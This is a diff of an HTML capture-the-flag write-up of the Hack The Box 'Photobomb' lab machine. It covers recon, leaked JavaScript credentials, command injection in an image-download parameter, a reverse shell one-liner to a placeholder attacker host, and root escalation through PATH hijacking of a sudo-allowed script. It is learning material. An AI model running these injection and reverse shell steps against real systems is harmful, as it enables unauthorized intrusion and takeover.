@@ -16,9 +16,9 @@
                 margin-right: 5px;
             }
             img.responsive {
-        max-width: 100%;
-        height: auto;
-    }
+                max-width: 100%;
+                height: auto;
+            }
         </style>
     </head>
     <body>
@@ -26,8 +26,7 @@
         <header id="header" style="width: 350px;">
             <div class="inner">
                 <a href="../index.html" class="image avatar"><img src="../images/avatar.jpg" alt="Juan Guevara Avatar" /></a>
-                <h1><strong>Photobomb Write-up</strong><br />
-                by Juan Guevara</h1>
+                <h1><strong>Photobomb Write-up</strong><br />by Juan Guevara</h1>
             </div>
         </header>
 
@@ -43,86 +42,81 @@
                     <span class="tag">Information Leakage</span>
                 </div>
 
-                <p><br>This is my detailed write-up for the Photobomb machine on Hack The Box. In this document, I will describe the steps and methods I used to gain access and eventually escalate privileges on the machine.</p>
+                <p>This is my detailed write-up for the Photobomb machine on Hack The Box. In this document, I will describe the steps and methods I used to gain access and eventually escalate privileges on the machine.</p>
 
                 <!-- Introduction -->
                 <h3>Introduction</h3>
-                <p>Photobomb is a beginner-level Linux machine designed to provide a hands-on experience in cybersecurity. In this setup, users will have the opportunity to apply their skills in identifying and exploiting common vulnerabilities. The machine focuses on authentication and credential handling, as well as examining specific functionalities of web applications. Additionally, participants will explore privilege escalation techniques through system scripting configurations and usage. This machine offers a realistic and safe environment for those interested in learning more about cybersecurity and penetration testing.</p>
+                <p>Photobomb is a beginner-level Linux machine designed to provide a hands-on experience in cybersecurity. This setup allows users to apply their skills in identifying and exploiting common vulnerabilities, focusing on authentication, credential handling, and examining web application functionalities. Additionally, it offers opportunities to explore privilege escalation techniques through system scripting configurations. This machine provides a realistic and safe environment for learning about cybersecurity and penetration testing.</p>
 
-                <!-- Reconn -->
-                <h3>Recon</h3>
-                <p>We start by performing a scan of all open TCP ports on the machine with the following command: nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.182 -oG allPorts</p>
+                <!-- Recon -->
+                <h3>Reconnaissance</h3>
+                <p>I started by performing a scan of all open TCP ports on the machine using the command: <code>nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.182 -oG allPorts</code></p>
                 <img src="htbpics/photobomb1.jpg" alt="Scanning for open ports" class="responsive">
 
-                <p>We use our extractPorts script and this will copy the open ports onto our clipboard, then we proceed to make a second nmap scan with this new info by running the following command: nmap -sCV -p22,80 10.10.11.182 -oN targeted</p>
+                <p>Next, I used the extractPorts script to copy open ports to the clipboard. I then conducted a second nmap scan with this new information: <code>nmap -sCV -p22,80 10.10.11.182 -oN targeted</code></p>
                 <img src="htbpics/photobomb2.jpg" alt="Scanning the open ports" class="responsive">
 
-                <p>To visualize the output in a more comfortable way, we can take advantage of bat (although we use cat as an alias for it) and we'll set up the flag -l to specify that we wanna highlight the output as it was Java code (even if it's not).<br>We can see that the TCP port 22 is open, port 22 is usually set for SSH and this is not the exception, and port 80 is also open, we can recognize this is a webpage, because of the http service and because the software serving the server is ngix, we can also see the word "Ubuntu" right next to it, so we can deduce we are facing a Linux machine</p>
+                <p>For better visualization, I utilized bat (alias for cat) with the -l flag to highlight the output as if it were Java code. The scan revealed that TCP port 22 (commonly used for SSH) and port 80 (indicating a web server running on nginx) were open. The mention of "Ubuntu" alongside these results suggested a Linux machine.</p>
                 <img src="htbpics/photobomb3.jpg" alt="Scan Results" class="responsive">
 
-                <p>If we try to go to http://10.10.11.182 we'll notice that the address will change to http://photobomb.htb, but we won't be able to reach it anyway</p>
-                <img src="htbpics/photobomb4.jpg" alt="Page not found" class="responsive">
+                <p>Visiting http://10.10.11.182 redirected to http://photobomb.htb, but the page was not reachable due to Virtual Hosting. To resolve this, I added an entry with the IP and domain in the /etc/hosts file.</p>
+                <img src="htbpics/photobomb5.jpg" alt="Editing /etc/hosts" class="responsive">
 
-                <p>And that's because of something called Virtual Hosting, we can easily fix this adding an entry with the ip and domain in our /etc/hosts file, remember to edit the file as sudo, otherwise you won't be able to write on it</p>
-                <img src="htbpics/photobomb5.jpg" alt="Editting /etc/hosts" class="responsive">
-
-                <p>Once we did that we can refresh our browser and we should see the website</p>
+                <p>After this adjustment, refreshing the browser displayed the website.</p>
                 <img src="htbpics/photobomb6.jpg" alt="Photobomb index" class="responsive">
 
-                <p>The page isn't so large so we can investigate clicking here and there, and we'll find out that by clicking on "click here!" an authentication form will show up</p>
+                <p>Exploring the site revealed an authentication form accessible by clicking "click here!".</p>
                 <img src="htbpics/photobomb7.jpg" alt="Login form" class="responsive">
 
-                <p>We can try some default credentials like admin:admin, admin:password or root:root, but none of them seem to work, so we gotta keep investigating, if we press CTRL+U and we read the source code we can see it's almost plain html code, but it also invokes the css stylesheet and a js script called photobomb.js</p>
+                <p>Inspecting the source code (CTRL+U) showed mostly plain HTML, with references to a CSS stylesheet and a JavaScript file named photobomb.js.</p>
                 <img src="htbpics/photobomb8.jpg" alt="Index source code" class="responsive">
 
-                <p>We can click on the script to see what's inside and we can see there's a credentials leakage on this code:</p>
+                <p>Examining the photobomb.js script revealed a credentials leak.</p>
                 <img src="htbpics/photobomb9.jpg" alt="Script with privileged info" class="responsive">
 
-                <p>It is a good practice to keep everything well organized so we'll storage these credentials, we never know how many times we can use them</p>
-                <img src="htbpics/photobomb10.jpg" alt="Saving creds" class="responsive">
+                <p>I stored these credentials for potential future use.</p>
+                <img src="htbpics/photobomb10.jpg" alt="Saving credentials" class="responsive">
 
                 <!-- Exploitation -->
                 <h3>Exploitation</h3>
-                <p>We use the credentials found to get access from the authentication form</p>
+                <p>Using the discovered credentials, I accessed the website through the authentication form.</p>
                 <img src="htbpics/photobomb11.jpg" alt="Inside the website" class="responsive">
 
-                <p>A quick look over the page let us know the function of the website, you can choose a picture, a format, a size and then you can download it, but, how does the http request work?</p>
-                <img src="htbpics/photobomb12.jpg" alt="Burpsuite intercepting the request for an image download" class="responsive">
+                <p>The website's functionality involved choosing a picture, format, and size for downloading. I wondered how the HTTP request was structured.</p>
+                <img src="htbpics/photobomb12.jpg" alt="Investigating HTTP request structure" class="responsive">
 
-                <p>Using Burpsuite we can intercept the request and then we can send it to the repeater to manipulate it</p>
-                <img src="htbpics/photobomb13.jpg" alt="Repeater tab with the request intercepted" class="responsive">
+                <p>Using Burp Suite, I intercepted the request and sent it to the repeater for modification.</p>
+                <img src="htbpics/photobomb13.jpg" alt="Intercepted request in Burp Suite Repeater" class="responsive">
 
-                <p>It seems like the website is using a standard image to resize it according to what we want, this can be done on the server side and therefore we can check if any of the fields on the request is suceptible to changes, and 'filetype' is, we can check this by running a command right after the value of the field, like in this example, where we are trying to execute id after jpg</p>
-                <img src="htbpics/photobomb14.jpg" alt="http 500 response" class="responsive">
+                <p>Observing that the 'filetype' parameter was vulnerable to injection, I experimented by appending a command after the value.</p>
+                <img src="htbpics/photobomb14.jpg" alt="Testing for code injection" class="responsive">
 
-                <p>The http 500 internat server error response let us know that we can indeed inject code on this, so we can create a one liner for a revershell and we will also need to url-encode it so we can send it through the request on Burpsuite, the one liner for this example is /bin/bash -c 'sh -i >& /dev/tcp/AttackerIP/AttackerPort 0>&1'</p>
-                <img src="htbpics/photobomb15.jpg" alt="URL-encoding revershell one liner" class="responsive">
+                <p>The HTTP 500 internal server error response indicated the possibility of code injection. To exploit this, I created a URL-encoded reverse shell one-liner: <code>/bin/bash -c 'sh -i >& /dev/tcp/AttackerIP/AttackerPort 0>&1'</code>, replacing the IP and port with my listener setup.</p>
+                <img src="htbpics/photobomb15.jpg" alt="URL-encoding reverse shell one-liner" class="responsive">
 
-                <p>Notice how we changed the ip and port to the ones we are gonna use to receive the revershell. Using netcat we can set up a listener in the same port as in our one liner, once it is ready, we can send the request on Burpsuite and we will receive the connection</p>
-                <img src="htbpics/photobomb16.jpg" alt="Netcat with the revershell" class="responsive">
+                <p>Setting up a netcat listener on the designated port and sending the modified request through Burp Suite resulted in a successful reverse shell connection.</p>
+                <img src="htbpics/photobomb16.jpg" alt="Receiving reverse shell with netcat" class="responsive">
 
-                <p>We can do a tty treatment to improve the terminal functionalities, click here to check how to do it</p>
-                
-                <!-- Privilege escalation -->
-                <h3>Privilege escalation</h3>
-                <p>We can start off checking if we can run something as sudo by running sudo -l</p>
-                <img src="htbpics/photobomb17.jpg" alt="sudo -l output" class="responsive">
+                <p>For an improved terminal experience, I performed a TTY upgrade (<a href="../guides/tty-upgrade.html">click here for instructions</a>).</p>
 
-                <p>And we can see there is indeed one script named /opt/cleanup.sh that can be run as sudo with no password</p>
-                <img src="htbpics/photobomb18.jpg" alt="elevation" class="responsive">
+                <!-- Privilege Escalation -->
+                <h3>Privilege Escalation</h3>
+                <p>Investigating potential sudo privileges with <code>sudo -l</code> revealed a script, /opt/cleanup.sh, that could be executed without a password.</p>
+                <img src="htbpics/photobomb17.jpg" alt="Checking sudo privileges" class="responsive">
 
-                <p>On the previous image we can see the content of the script that we can run as sudo, the very last line of that script starts with 'find' (instead of /usr/bin/find), that's why we create a file named 'find' with 'sh' in its content, because if we get to manipulate the PATH we can make the system 'think' it should run our find instead of the one in /usr/bin/find<br>We can also check the user flag at this point</p>
-                <img src="htbpics/photobomb19.jpg" alt="Script with privileged info" class="responsive">
-                <p>Although we usually cannot change the PATH variable without being a superuser, we can take advantage of the sudo privileges for /opt/cleanup.sh and run the script but considering a new path by running this: sudo PATH=$PWD:$PATH /opt/cleanup.sh<br>That will run the script and when it reaches the last line, instead of executing the original 'find' binary, it will run the one we wrote, because of the PATH hierarchy.<br><br>Running our 'find' file will actually run 'sh' as sudo, that means we now have a sh as root and we can find the root flag in /root as shown on the last pic.</p>
+                <p>The script, shown in the following image, contained a line starting with 'find' (not /usr/bin/find), allowing me to exploit the PATH variable. I created a file named 'find' containing 'sh' to hijack the script's execution path.</p>
+                <img src="htbpics/photobomb18.jpg" alt="Contents of the exploitable script" class="responsive">
 
+                <p>I ran the script with a modified PATH, causing it to execute my 'find' script instead of the intended binary: <code>sudo PATH=$PWD:$PATH /opt/cleanup.sh</code>. This granted me a shell with root privileges, as demonstrated in the final image, where I accessed the root flag.</p>
+                <img src="htbpics/photobomb19.jpg" alt="Achieving root access" class="responsive">
 
                 <!-- Conclusion -->
                 <h3>Conclusion</h3>
-                <p></p>
+                <p>The Photobomb machine provided a comprehensive learning experience in web exploitation and privilege escalation. Through methodical reconnaissance, code injection, and clever manipulation of system configurations, I gained both user and root access. This exercise underscored the importance of thorough system auditing and the potential dangers of overlooked vulnerabilities.</p>
 
                 <!-- Back button -->
                 <div class="back-button" style="padding-top: 20px;">
-                    <a href="../index.html" class="button">Back</a>
+                    <a href="../index.html" class="button">Back to Portafolio</a>
                 </div>
             </section>
         </div>
